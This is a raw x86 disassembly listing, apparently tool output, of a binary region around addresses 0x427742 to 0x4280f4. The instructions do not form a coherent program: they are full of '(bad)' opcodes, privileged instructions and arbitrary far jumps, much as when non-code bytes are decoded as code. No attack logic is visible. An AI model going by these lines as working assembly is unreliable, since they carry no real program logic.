  427742:	xor    esi,DWORD PTR ds:0xc087e615
  427748:	jnp    0x42777b
  42774a:	push   cs
  42774b:	in     eax,dx
  42774c:	push   es
  42774d:	cmp    edx,DWORD PTR [edi]
  42774f:	adc    BYTE PTR [edi],dh
  427751:	leave  
  427752:	stos   DWORD PTR es:[edi],eax
  427753:	test   BYTE PTR [ebp+0x4d],bl
  427756:	icebp  
  427757:	retf   0x8ea0
  42775a:	adc    esp,0xf73eb377
  427760:	xor    BYTE PTR [ecx],bh
  427762:	jg     0x4277ab
  427764:	or     al,0x92
  427766:	jecxz  0x42770b
  427768:	in     al,0x4
  42776a:	sub    cl,dl
  42776c:	xchg   ebx,eax
  42776d:	call   0x36f:0x12533629
  427774:	xchg   edx,eax
  427775:	fld    st(3)
  427777:	outs   dx,BYTE PTR ds:[esi]
  427778:	ds mov ebx,0x9c0595c9
  42777e:	in     eax,dx
  42777f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427780:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427781:	push   ss
  427782:	dec    ebx
  427783:	pushf  
  427784:	sbb    dl,BYTE PTR [ebx-0x27ce69b8]
  42778a:	fisubr DWORD PTR [ebx+0x40aa77b6]
  427790:	cs gs icebp 
  427793:	sub    BYTE PTR [esi+0x2b5854d1],ah
  427799:	mov    eax,0xba694816
  42779e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42779f:	xor    eax,0x1bce9ab
  4277a4:	pop    ss
  4277a5:	dec    edx
  4277a6:	push   ebp
  4277a7:	xchg   edx,eax
  4277a8:	cmp    esi,DWORD PTR [eax+0x58]
  4277ab:	jnp    0x42773c
  4277ad:	ins    DWORD PTR es:[edi],dx
  4277ae:	xchg   edx,eax
  4277b0:	dec    edx
  4277b1:	mov    ah,0xcb
  4277b3:	imul   esi,DWORD PTR [edi],0x4c
  4277b6:	and    bl,BYTE PTR [esi]
  4277b8:	and    al,0x45
  4277ba:	lods   eax,DWORD PTR ds:[esi]
  4277bb:	fidiv  WORD PTR [eax+0x7dbdd96a]
  4277c1:	add    al,0xf1
  4277c3:	push   eax
  4277c4:	cmc    
  4277c5:	rcr    DWORD PTR [esp+ebx*1-0x5b],0x0
  4277ca:	inc    edx
  4277cb:	cmc    
  4277cc:	(bad)  
  4277cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4277ce:	stos   BYTE PTR es:[edi],al
  4277cf:	jmp    0x1ec5:0xeb58fb45
  4277d6:	xor    ebp,DWORD PTR [ebx-0x1]
  4277d9:	xor    al,0xed
  4277db:	out    dx,al
  4277dc:	iret   
  4277dd:	les    ebx,FWORD PTR ds:0x53cf11f
  4277e3:	out    dx,eax
  4277e4:	pop    edi
  4277e5:	retf   0xbf2d
  4277e8:	xlat   BYTE PTR ds:[ebx]
  4277e9:	sbb    eax,DWORD PTR [ecx+0x22e2ef87]
  4277ef:	dec    eax
  4277f0:	sbb    dh,BYTE PTR [edi]
  4277f2:	xor    BYTE PTR ds:0x9a8899a8,bh
  4277f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4277f9:	push   ds
  4277fa:	in     al,dx
  4277fb:	dec    eax
  4277fc:	fld    DWORD PTR [esi]
  4277fe:	ja     0x4277d0
  427800:	mov    ?,WORD PTR [bp+di-0x7d6]
  427805:	fcmovb st,st(4)
  427807:	sar    BYTE PTR [ebp+ecx*4-0x6142ff0a],1
  42780e:	mov    edi,0xad5d
	...
  427873:	add    BYTE PTR [edx],bl
  427875:	mov    cl,BYTE PTR [ebx]
  427877:	inc    ebp
  427878:	fwait
  427879:	lds    ebx,FWORD PTR [esi-0x21]
  42787c:	jo     0x4278e3
  42787e:	fldl2e 
  427880:	pop    edi
  427881:	cmp    esp,DWORD PTR [ecx-0x64]
  427884:	icebp  
  427885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427886:	add    DWORD PTR [eax],eax
  427888:	add    eax,0xe9000001
  42788d:	sbb    edx,DWORD PTR [edx]
  42788f:	mov    ch,0xb9
  427891:	out    dx,al
  427892:	mov    edx,0xdf8c215
  427897:	xor    ch,BYTE PTR [eax-0x58]
  42789a:	repnz pop ecx
  42789c:	xor    al,0x19
  42789e:	pushf  
  42789f:	or     DWORD PTR [edx-0x2f4fa567],esp
  4278a5:	stc    
  4278a6:	loopne 0x42789a
  4278a8:	pop    ecx
  4278a9:	adc    ah,dh
  4278ab:	ins    BYTE PTR es:[edi],dx
  4278ac:	sbb    dh,BYTE PTR [edi-0x2f06947f]
  4278b2:	call   0xbb00:0xc049190d
  4278b9:	inc    ecx
  4278ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4278bb:	mov    ebx,0x6935d865
  4278c0:	jae    0x42786f
  4278c2:	icebp  
  4278c3:	cmp    bh,cl
  4278c5:	adc    DWORD PTR [esi-0x47acd98e],ecx
  4278cb:	mov    edi,0x293c4650
  4278d0:	mov    dh,0x3d
  4278d2:	je     0x427882
  4278d4:	xchg   ecx,eax
  4278d5:	imul   BYTE PTR [ebp-0xc]
  4278d8:	shl    eax,cl
  4278da:	jns    0x427925
  4278dc:	shl    al,cl
  4278de:	mov    ds:0xaca1a1a4,eax
  4278e3:	jno    0x427902
  4278e5:	mov    eax,0x56232baf
  4278ea:	adc    al,0xf4
  4278ec:	bound  esi,QWORD PTR [edx-0x2d]
  4278ef:	sbb    BYTE PTR [ecx+eiz*1],0xd3
  4278f3:	mov    esi,0xc10ab43b
  4278f8:	leave  
  4278f9:	or     dh,BYTE PTR [ebp-0x1a]
  4278fc:	mov    bl,0xd8
  4278fe:	jb     0x4278a1
  427900:	jb     0x4278b6
  427902:	xor    eax,0xdcd96c3a
  427907:	lods   al,BYTE PTR ds:[esi]
  427908:	mul    eax
  42790a:	dec    edx
  42790b:	mov    bh,0xfa
  42790d:	push   cs
  42790e:	jne    0x42789a
  427910:	(bad)  
  427911:	lods   eax,DWORD PTR ds:[esi]
  427912:	xor    BYTE PTR [edx+0x35],0x41
  427916:	mov    DWORD PTR [ebp+0x3f9a8c74],edi
  42791c:	push   es
  42791d:	cmp    ch,BYTE PTR [edi-0x38]
  427920:	aam    0x98
  427922:	jl     0x4278b6
  427924:	or     dl,BYTE PTR ds:0xa9a62adc
  42792a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42792b:	push   ds
  42792c:	mov    bh,0xa1
  42792e:	cwde   
  42792f:	dec    esp
  427930:	pop    ebp
  427931:	dec    esi
  427932:	add    al,0xf6
  427934:	dec    edi
  427935:	shr    BYTE PTR [eax],1
  427937:	(bad)  
  427938:	or     ecx,DWORD PTR [ebx]
  42793a:	inc    edi
  42793b:	es xchg edi,eax
  42793d:	ret    
  42793e:	push   cs
  42793f:	dec    edi
  427940:	inc    esp
  427941:	and    BYTE PTR [ebx+0x34],0x87
  427945:	int    0x1a
  427947:	add    eax,0xd7ce5484
  42794c:	rcr    BYTE PTR [ecx+0x6907a848],cl
  427952:	pop    esi
  427953:	push   0x6f1e9fec
  427958:	aam    0x4a
  42795a:	add    ah,BYTE PTR [edx+0x4]
  42795d:	mov    ch,0x8d
  42795f:	inc    edi
  427960:	cmp    al,0xb
  427962:	jb     0x4279c1
  427964:	jb     0x427912
  427966:	pop    ebx
  427967:	jbe    0x42792d
  427969:	outs   dx,DWORD PTR ds:[esi]
  42796a:	push   0xffffffb1
  42796c:	cmp    eax,0x2065584b
  427971:	xchg   edi,eax
  427972:	xchg   esp,eax
  427973:	pop    eax
  427974:	jmp    0x427989
  427976:	jne    0x4279c9
  427978:	lock add al,BYTE PTR [eax]
  42797b:	aas    
  42797c:	(bad)  
  42797d:	jl     0x4279a2
  42797f:	jae    0x42797e
  427981:	bound  ecx,QWORD PTR [esi]
  427983:	pop    ebp
  427984:	jg     0x4279dc
  427986:	xlat   BYTE PTR ds:[ebx]
  427987:	cmp    dl,BYTE PTR [ebx-0x4a40397]
  42798d:	mov    eax,0xcedce8
	...
  4279f2:	add    BYTE PTR [eax],al
  4279f4:	call   0xdea3:0xffa3ffdd
  4279fb:	std    
  4279fc:	inc    edx
  4279fd:	jne    0x4279d7
  4279ff:	adc    DWORD PTR ds:0xf6748154,0xffffffa7
  427a06:	add    DWORD PTR [eax],eax
  427a08:	add    eax,0x25000001
  427a0d:	ret    0xa6d6
  427a10:	jns    0x427a1b
  427a12:	push   ds
  427a13:	add    eax,0xff06b03f
  427a18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a19:	rcr    DWORD PTR [eax-0xaa0820],0xcd
  427a20:	jmp    0xe934546d
  427a25:	into   
  427a26:	jbe    0x4279c2
  427a28:	outs   dx,BYTE PTR ds:[esi]
  427a29:	pop    ss
  427a2a:	cmp    DWORD PTR [ecx+0x1b1b2cc0],0x571d162b
  427a34:	in     al,dx
  427a35:	test   ecx,0x15006248
  427a3b:	jno    0x427a0a
  427a3d:	xor    BYTE PTR [ecx-0x20dba17f],al
  427a43:	sub    eax,0x1d2c41a6
  427a48:	addr16 gs dec ebx
  427a4b:	loope  0x427a23
  427a4d:	pop    ss
  427a4e:	jnp    0x4279dc
  427a50:	mov    bl,0xac
  427a52:	sbb    al,0xd1
  427a54:	xchg   ebx,eax
  427a55:	mov    BYTE PTR [esi+eax*2+0xf],al
  427a59:	dec    DWORD PTR [edx+0x3f]
  427a5c:	xor    eax,0x2ff97268
  427a61:	cwde   
  427a62:	inc    edx
  427a63:	jo     0x427a6d
  427a65:	cli    
  427a66:	shl    edi,cl
  427a68:	(bad)  
  427a69:	call   0x28c41cd7
  427a6e:	mov    ds:0x7e67d76,eax
  427a73:	ret    
  427a74:	cwde   
  427a75:	xor    al,0x17
  427a77:	clc    
  427a78:	xchg   ebx,eax
  427a79:	pop    ebx
  427a7a:	iret   
  427a7b:	dec    eax
  427a7c:	pusha  
  427a7d:	pop    ds
  427a7e:	int3   
  427a7f:	xchg   ebp,eax
  427a80:	dec    eax
  427a81:	dec    ebp
  427a82:	pushf  
  427a83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a84:	lahf   
  427a85:	out    dx,al
  427a86:	xchg   edi,eax
  427a87:	int3   
  427a88:	cmp    BYTE PTR [ebx+ebp*8],0xc0
  427a8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a8d:	xchg   ebx,eax
  427a8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a8f:	pop    ss
  427a90:	rcl    BYTE PTR [edx+0x7919e19c],0x4e
  427a97:	xor    edi,ebx
  427a99:	jge    0x427aeb
  427a9b:	add    al,0x4a
  427a9d:	xor    al,BYTE PTR [eax+eax*8]
  427aa0:	in     al,0xf6
  427aa2:	xchg   DWORD PTR [ecx-0x3e],esi
  427aa5:	gs mov edi,0xa78e583a
  427aab:	or     DWORD PTR [ebx-0x369e4426],edx
  427ab1:	dec    bh
  427ab3:	sub    eax,0xebdb593c
  427ab8:	and    DWORD PTR [edx+0xf],ebx
  427abb:	les    ecx,FWORD PTR [eax-0x34]
  427abe:	mov    dh,0x65
  427ac0:	fcom   QWORD PTR [ebx]
  427ac2:	add    ch,BYTE PTR [ecx]
  427ac4:	mov    edi,edi
  427ac6:	inc    ebp
  427ac7:	adc    al,0x28
  427ac9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427aca:	dec    esi
  427acb:	xor    BYTE PTR [ebp+0x2b895005],bl
  427ad1:	cmp    cl,BYTE PTR [esi-0x514926d3]
  427ad7:	xchg   edx,eax
  427ad8:	and    eax,0x3e6dab2a
  427add:	in     al,dx
  427ade:	push   ebp
  427adf:	loop   0x427b1a
  427ae1:	(bad)  
  427ae2:	push   eax
  427ae3:	sub    eax,0x6e5bb6c0
  427ae8:	jge    0x427aa3
  427aea:	mov    eax,0x3c327f26
  427aef:	add    DWORD PTR [edx],edi
  427af1:	add    al,BYTE PTR [ecx-0x290bbaa3]
  427af7:	leave  
  427af8:	inc    ebx
  427af9:	js     0x427b02
  427afb:	leave  
  427afc:	sub    al,0x58
  427afe:	pop    ecx
  427aff:	xor    BYTE PTR [ebx],bh
  427b01:	stc    
  427b02:	es jne 0x427b34
  427b05:	inc    edx
  427b06:	or     al,0xbb
  427b08:	add    eax,0x57210fd2
  427b0d:	outs   dx,BYTE PTR ds:[esi]
  427b0e:	mov    ecx,0x682f
	...
  427b73:	add    dl,cl
  427b75:	mov    edx,DWORD PTR [edx+0x7b]
  427b78:	push   ebx
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	neg    BYTE PTR [eax]
  427b81:	push   ecx
  427b82:	in     al,0x2
  427b84:	sti    
  427b85:	test   al,0x1
  427b87:	add    BYTE PTR ds:0x97000001,al
  427b8d:	cdq    
  427b8e:	cmp    eax,0x68c488e3
  427b93:	call   ecx
  427b95:	mov    BYTE PTR [ecx+0x69],dh
  427b98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b99:	clc    
  427b9a:	jmp    0x427bf1
  427b9c:	and    bx,cx
  427b9f:	mov    BYTE PTR [esi+esi*4],cl
  427ba2:	lds    ecx,FWORD PTR ds:0x95e06ab
  427ba8:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  427baa:	in     al,0x92
  427bac:	jp     0x427b37
  427bae:	mov    BYTE PTR [esi-0x57],al
  427bb1:	cli    
  427bb2:	stos   DWORD PTR es:[edi],eax
  427bb3:	arpl   ax,ax
  427bb5:	pop    edx
  427bb6:	dec    esp
  427bb7:	fsub   DWORD PTR [ebx-0x9f07a00]
  427bbd:	inc    eax
  427bbe:	stc    
  427bbf:	frstor [edi-0x60]
  427bc2:	cli    
  427bc3:	and    eax,0xf5e20218
  427bc8:	les    edx,FWORD PTR [ebx-0x1c]
  427bcb:	scas   eax,DWORD PTR es:[edi]
  427bcc:	pop    ecx
  427bcd:	xchg   ecx,eax
  427bce:	pop    esp
  427bcf:	cmp    eax,DWORD PTR [ebp-0x7bb2a2a6]
  427bd5:	mov    ah,dl
  427bd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427bd8:	lock mov ds:0x82ae14db,al
  427bde:	enter  0xe89a,0x1
  427be2:	cld    
  427be3:	das    
  427be4:	mov    ebp,0x885e5ecb
  427be9:	pushf  
  427bea:	cli    
  427beb:	pushf  
  427bec:	fsub   st(2),st
  427bee:	out    0xab,al
  427bf0:	jbe    0x427c29
  427bf2:	or     BYTE PTR [ebp+0x44e3f24c],cl
  427bf8:	vxorps xmm2,xmm7,XMMWORD PTR [edi]
  427bfc:	rol    esi,cl
  427bfe:	mov    BYTE PTR [edi+0x0],ch
  427c01:	xor    DWORD PTR [ebp+0x75],ebp
  427c04:	std    
  427c05:	bound  esi,QWORD PTR [ebp+ebp*4-0x4d]
  427c09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c0a:	in     al,dx
  427c0b:	(bad)  [ebp+0x37]
  427c0e:	cmp    ebx,esp
  427c10:	push   cs
  427c11:	push   sp
  427c13:	jb     0x427bf5
  427c15:	xchg   esp,eax
  427c16:	cs test al,0x77
  427c19:	xchg   edi,eax
  427c1a:	popf   
  427c1b:	inc    esi
  427c1c:	and    DWORD PTR [ecx],edx
  427c1e:	jnp    0x427c99
  427c20:	shr    DWORD PTR [edx+0x4d],1
  427c23:	push   ds
  427c24:	add    ecx,esi
  427c26:	cs or  al,0x81
  427c29:	in     al,0xc0
  427c2b:	mov    dl,BYTE PTR [ebx]
  427c2d:	pushf  
  427c2e:	mov    fs,WORD PTR [ebx]
  427c30:	bound  esi,QWORD PTR [ecx+0x20]
  427c33:	mov    ch,0x54
  427c35:	and    dh,BYTE PTR [edx-0x4532209a]
  427c3b:	xchg   edi,eax
  427c3c:	mov    ebp,0x22d5f40d
  427c41:	inc    esi
  427c42:	inc    ecx
  427c43:	into   
  427c44:	in     eax,dx
  427c45:	or     al,0x6c
  427c47:	xor    cl,BYTE PTR [esp+edi*4+0x18]
  427c4b:	jmp    0x9d50:0x1eaafc4b
  427c52:	out    0x9b,al
  427c54:	int    0x68
  427c56:	retf   
  427c57:	mov    ah,0xf4
  427c59:	mov    ebp,0xdca859d8
  427c5e:	dec    eax
  427c5f:	dec    esi
  427c60:	jmp    0x427ca7
  427c62:	ja     0x427c11
  427c64:	pop    esp
  427c65:	sbb    al,0xc1
  427c67:	inc    eax
  427c68:	into   
  427c69:	xor    BYTE PTR [ecx+ebp*2-0x5471472f],bl
  427c70:	push   edi
  427c71:	inc    eax
  427c72:	enter  0xa003,0x77
  427c76:	int    0x6e
  427c78:	(bad)  
  427c7a:	in     eax,dx
  427c7b:	sub    esi,DWORD PTR [edi-0x225b67de]
  427c81:	lahf   
  427c82:	cmp    DWORD PTR [ebx+0x39],edi
  427c85:	mov    esi,0xab8f7321
  427c8a:	inc    edi
  427c8b:	adc    BYTE PTR ds:0xa6cb88ef,dl
	...
  427cf1:	add    BYTE PTR [eax],al
  427cf3:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0x9f545d44,ebx
  427d02:	mov    al,0x6e
  427d04:	add    BYTE PTR [edx+0x1050001],ch
  427d0a:	add    BYTE PTR [eax],al
  427d0c:	push   esp
  427d0d:	and    DWORD PTR [ebp-0xe],edi
  427d10:	(bad)  
  427d12:	mov    edi,0xe0f00f21
  427d17:	clc    
  427d18:	and    DWORD PTR [ebx],0x1cd538d5
  427d1e:	jmp    0x427d27
  427d20:	pfmax  mm5,QWORD PTR [esi]
  427d24:	xor    DWORD PTR [esi+0x65],esi
  427d27:	xchg   esi,eax
  427d28:	repz push es
  427d2a:	dec    edx
  427d2b:	xchg   edx,eax
  427d2c:	leave  
  427d2d:	outs   dx,BYTE PTR ds:[esi]
  427d2e:	add    al,al
  427d30:	jbe    0x427d33
  427d32:	cdq    
  427d33:	pop    es
  427d34:	ds nop
  427d36:	mov    ebp,0x5fe90e1b
  427d3b:	clc    
  427d3c:	pop    ds
  427d3d:	inc    edx
  427d3e:	sbb    esp,DWORD PTR [eax+0x13]
  427d41:	mov    esp,0x48568e4e
  427d46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d47:	cmc    
  427d48:	mov    BYTE PTR [ebx],dh
  427d4a:	xchg   edi,eax
  427d4b:	fwait
  427d4c:	mov    al,BYTE PTR [ecx-0x6a]
  427d4f:	pop    ecx
  427d50:	add    al,0xe8
  427d52:	test   BYTE PTR es:[ebx+0x28],cl
  427d56:	mov    ds,WORD PTR [ebx]
  427d58:	push   cs
  427d59:	out    dx,eax
  427d5a:	stos   DWORD PTR es:[edi],eax
  427d5b:	or     ebp,DWORD PTR [edi]
  427d5d:	call   0x35a1:0xe48f3fb2
  427d64:	retf   0x41a4
  427d67:	sti    
  427d68:	mov    edi,0x42d3e437
  427d6d:	cmp    al,0x97
  427d6f:	int    0xb
  427d71:	add    eax,DWORD PTR [ebx+esi*4]
  427d74:	daa    
  427d75:	cmp    al,0x53
  427d77:	pop    ecx
  427d78:	or     BYTE PTR [esi+0x7bf93b1],cl
  427d7e:	jno    0x427dbf
  427d80:	div    ebp
  427d82:	xor    al,0x2c
  427d84:	pop    eax
  427d85:	or     ebx,eax
  427d87:	nop
  427d88:	push   esp
  427d89:	stos   BYTE PTR es:[edi],al
  427d8a:	add    DWORD PTR [ebx-0x43],ecx
  427d8d:	pop    ds
  427d8e:	les    ebx,FWORD PTR [edi]
  427d90:	test   al,0xda
  427d92:	mul    BYTE PTR [esi]
  427d94:	jmp    0x427d35
  427d96:	in     eax,0x28
  427d98:	loope  0x427dff
  427d9a:	mov    dl,0xa
  427d9c:	pop    ebp
  427d9d:	jmp    0x427da3
  427d9f:	cmp    dl,BYTE PTR [ebp+0x2c96017e]
  427da5:	jae    0x427d47
  427da7:	ret    
  427da8:	jmp    0xa04c:0x619f288e
  427daf:	ins    DWORD PTR es:[edi],dx
  427db0:	add    ax,0x427b
  427db4:	sar    DWORD PTR [ebx],cl
  427db6:	dec    esp
  427db7:	aaa    
  427db8:	push   ebx
  427db9:	fdiv   QWORD PTR [ebx+0x2c]
  427dbc:	out    0x84,al
  427dbe:	add    esi,DWORD PTR [ebp+edx*2-0x6ad7f9f7]
  427dc5:	mov    ds:0x5e9a83c7,al
  427dca:	jb     0x427dbe
  427dcc:	lods   al,BYTE PTR ds:[esi]
  427dcd:	loope  0x427db4
  427dcf:	sbb    ebp,ecx
  427dd1:	fnsave [ecx-0x2a]
  427dd4:	mov    esp,0x766de0cc
  427dd9:	cmp    al,0x4a
  427ddb:	xchg   edi,eax
  427ddc:	sub    eax,0xaf2e082a
  427de1:	ror    BYTE PTR es:[esi],1
  427de4:	dec    edx
  427de5:	mov    dl,0xc3
  427de7:	test   eax,0x9ae172f8
  427dec:	add    esp,DWORD PTR [eax-0x59d76a28]
  427df2:	inc    ebp
  427df3:	mov    ds:0x2896a78e,eax
  427df8:	mov    bx,0xca55
  427dfc:	sahf   
  427dfd:	cmp    al,0x3e
  427dff:	xchg   ebp,eax
  427e00:	mov    bh,0xa6
  427e02:	sti    
  427e03:	idiv   ebp
  427e05:	fisub  DWORD PTR [edi+0x0]
  427e08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427e09:	xor    bl,BYTE PTR [edx-0x4]
  427e0c:	out    0x27,eax
  427e0e:	retf   0x4537
	...
  427e71:	add    BYTE PTR [eax],al
  427e73:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	sub    edi,DWORD PTR [edi+0x33]
  427e83:	mov    ds:0x1ab05,eax
  427e88:	add    eax,0xf2000001
  427e8d:	and    BYTE PTR [edi+0x2c],al
  427e90:	adc    eax,0xd42a2a4c
  427e95:	push   0xa
  427e97:	fcomp  DWORD PTR [esi-0x2d]
  427e9a:	mov    esi,0x3d03ea85
  427e9f:	(bad)  [edi]
  427ea1:	cmp    bh,BYTE PTR ds:0xab14730b
  427ea7:	sub    al,dh
  427ea9:	xchg   ebp,eax
  427eaa:	ffree  st(2)
  427eac:	adc    ebp,esi
  427eae:	mov    dh,0xd
  427eb0:	popa   
  427eb1:	mov    ah,0x63
  427eb3:	(bad)  
  427eb4:	nop
  427eb5:	xchg   esi,eax
  427eb6:	ja     0x427ee3
  427eb8:	mov    al,0xda
  427eba:	outs   dx,BYTE PTR ds:[esi]
  427ebb:	push   ecx
  427ebc:	js     0x427eef
  427ebe:	xlat   BYTE PTR ds:[ebx]
  427ebf:	mov    ah,0xad
  427ec1:	and    al,0x74
  427ec3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427ec4:	setle  cl
  427ec7:	xchg   DWORD PTR [ecx+0x41],ecx
  427eca:	mov    es,WORD PTR [ebx+0x304d9bee]
  427ed0:	xchg   ebx,eax
  427ed1:	mov    bh,0x8c
  427ed3:	mov    eax,0x1be46822
  427ed8:	mov    ds:0xe2da4e05,eax
  427edd:	xor    DWORD PTR [edi+0x76],esi
  427ee0:	mov    ds:0xabc96bfb,al
  427ee5:	jns    0x427e9d
  427ee7:	push   0xd
  427ee9:	je     0x427ebd
  427eeb:	fmul   DWORD PTR [ebp-0x1d]
  427eee:	cmp    ah,BYTE PTR [ebp+0xacc8a7a]
  427ef4:	mov    al,ds:0x33524acc
  427ef9:	mov    esp,0x227eb408
  427efe:	pop    esp
  427eff:	hlt    
  427f00:	dec    edi
  427f01:	call   0x43e3:0x6c578874
  427f08:	xchg   ecx,eax
  427f09:	pusha  
  427f0a:	adc    esi,ebp
  427f0c:	push   ebx
  427f0d:	add    esi,DWORD PTR [edi]
  427f0f:	stos   DWORD PTR es:[edi],eax
  427f10:	popa   
  427f11:	and    BYTE PTR [eax-0x39],ah
  427f14:	lds    edi,FWORD PTR [eax-0x63a052c0]
  427f1a:	ror    bh,cl
  427f1c:	outs   dx,BYTE PTR ds:[esi]
  427f1d:	sub    BYTE PTR [edi+0x67],bl
  427f20:	ret    
  427f21:	and    esp,0x13
  427f24:	mov    bh,0x3a
  427f26:	(bad)
  427f2a:	adc    eax,0xdddeede9
  427f2f:	out    0x77,al
  427f31:	xor    cl,BYTE PTR [ecx-0x16753c30]
  427f37:	fadd   st,st(2)
  427f39:	stc    
  427f3a:	mov    ds:0xe759c432,eax
  427f3f:	pusha  
  427f40:	jmp    0x427f27
  427f42:	aad    0xc6
  427f44:	bound  esp,QWORD PTR [ebp-0x5a5c3a5]
  427f4a:	and    DWORD PTR [edi+0x32],ebx
  427f4d:	adc    ch,dl
  427f4f:	test   DWORD PTR [eax-0x4294021d],0xc4812ccd
  427f59:	jl     0x427f63
  427f5b:	imul   ebx,DWORD PTR [edx-0x70],0xb08ac6ec
  427f62:	popf   
  427f63:	mov    WORD PTR [ecx-0xe75c657],ss
  427f69:	sub    DWORD PTR [edi-0x3f63514a],esi
  427f6f:	out    dx,eax
  427f70:	push   cs
  427f71:	loop   0x427fec
  427f73:	ja     0x427f85
  427f75:	mul    DWORD PTR [ebp+0x43]
  427f78:	push   es
  427f79:	outs   dx,DWORD PTR ds:[esi]
  427f7a:	cmp    ecx,edi
  427f7c:	mov    dl,0x4d
  427f7e:	jns    0x427f7f
  427f80:	mov    dl,0x4f
  427f82:	lahf   
  427f83:	outs   dx,DWORD PTR ds:[esi]
  427f84:	ins    BYTE PTR es:[edi],dx
  427f85:	mov    bl,0x2e
  427f87:	int3   
  427f88:	jecxz  0x427f25
  427f8a:	adc    edx,DWORD PTR ds:0x744e0297
  427f90:	or     al,0x0
	...
  427ff2:	add    BYTE PTR [eax],al
  427ff4:	mov    cl,0xa7
  427ff6:	dec    ebx
  427ff7:	das    
  427ff8:	pop    edi
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	and    DWORD PTR [eax],0x15
  428003:	cmp    cl,BYTE PTR [edx]
  428005:	lods   al,BYTE PTR ds:[esi]
  428006:	add    DWORD PTR [eax],eax
  428008:	add    eax,0xa6000001
  42800d:	in     eax,0x7f
  42800f:	pop    ecx
  428010:	daa    
  428011:	add    DWORD PTR [ebp-0x391f0b44],esp
  428017:	rsm    
  428019:	push   ss
  42801a:	pop    ecx
  42801b:	cmp    ebp,eax
  42801d:	jle    0x428064
  42801f:	sub    edi,DWORD PTR [ecx+ecx*8+0x11]
  428023:	pop    ss
  428024:	xor    DWORD PTR [edx],0xffffff82
  428027:	in     al,dx
  428028:	stos   DWORD PTR es:[edi],eax
  428029:	cmp    al,BYTE PTR [edx-0x64]
  42802c:	adc    ebp,ebp
  42802e:	mov    esp,0x6adabbc4
  428033:	or     eax,0x77b6689a
  428038:	cwde   
  428039:	fidiv  WORD PTR [ebx-0x53]
  42803c:	mov    BYTE PTR [edi+0x79],cl
  42803f:	jo     0x42806c
  428041:	fiadd  DWORD PTR [edx]
  428043:	mov    ebx,0x39c9844b
  428048:	or     DWORD PTR [eax+0x3315d70b],0xffffffda
  42804f:	xchg   ebp,eax
  428050:	clc    
  428051:	icebp  
  428052:	adc    eax,0xe36a5f27
  428057:	dec    eax
  428058:	jne    0x428023
  42805a:	fimul  DWORD PTR [ebx]
  42805c:	ins    DWORD PTR es:[edi],dx
  42805d:	jmp    DWORD PTR [edx]
  42805f:	js     0x4280c7
  428061:	pop    edx
  428062:	dec    edi
  428063:	loop   0x42808c
  428065:	mov    bl,0xed
  428067:	fldcw  WORD PTR [bp+si-0x6187]
  42806c:	pop    edi
  42806d:	fs mul edx
  428070:	jge    0x4280ad
  428072:	push   esp
  428073:	stos   BYTE PTR es:[edi],al
  428074:	inc    eax
  428075:	in     al,dx
  428076:	repnz retf 
  428078:	fwait
  428079:	std    
  42807a:	aam    0x40
  42807c:	jno    0x4280db
  42807e:	test   eax,0x2be52136
  428083:	xor    DWORD PTR [esi-0x297a4ce1],ecx
  428089:	loope  0x4280f9
  42808b:	mov    DWORD PTR [ebx+0x2de1b84f],esi
  428091:	mov    cl,BYTE PTR [ebx+0x188e2789]
  428097:	sub    BYTE PTR [eax+0x78],ah
  42809a:	outs   dx,BYTE PTR ds:[esi]
  42809b:	test   al,0x4
  42809d:	push   ebp
  42809e:	or     dl,BYTE PTR [edx-0xdb6e018]
  4280a4:	pop    eax
  4280a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4280a6:	and    DWORD PTR [ebx],edx
  4280a8:	ret    0xd03b
  4280ab:	xchg   BYTE PTR [edi+0x13],ah
  4280ae:	in     al,0xa
  4280b0:	lds    eax,FWORD PTR [ecx+0x33e08d12]
  4280b6:	arpl   dx,bp
  4280b8:	lahf   
  4280b9:	xor    ebp,DWORD PTR [edx+0x5]
  4280bc:	test   DWORD PTR [ecx+0x76],ecx
  4280bf:	data16 std 
  4280c1:	mov    gs,WORD PTR [esi+eiz*1+0x72916ab8]
  4280c8:	xchg   esi,eax
  4280c9:	pop    esp
  4280ca:	sbb    DWORD PTR [esi+ebp*2-0x1cb7bb0c],ebp
  4280d1:	jnp    0x428106
  4280d3:	retf   0xead0
  4280d6:	xchg   BYTE PTR [edi],dl
  4280d8:	mov    ecx,DWORD PTR [ecx]
  4280da:	inc    edi
  4280db:	adc    esp,DWORD PTR [bp+si+0x1f6e]
  4280e0:	push   0xffffff98
  4280e2:	fst    QWORD PTR [esi+0x56]
  4280e5:	inc    edi
  4280e6:	xor    eax,ecx
  4280e8:	xchg   ecx,eax
  4280e9:	inc    ecx
  4280ea:	inc    eax
  4280eb:	(bad)  
  4280ec:	int3   
  4280ed:	xchg   esi,eax
  4280ee:	lock or eax,0xa05a56da
  4280f4:	pop    ebp
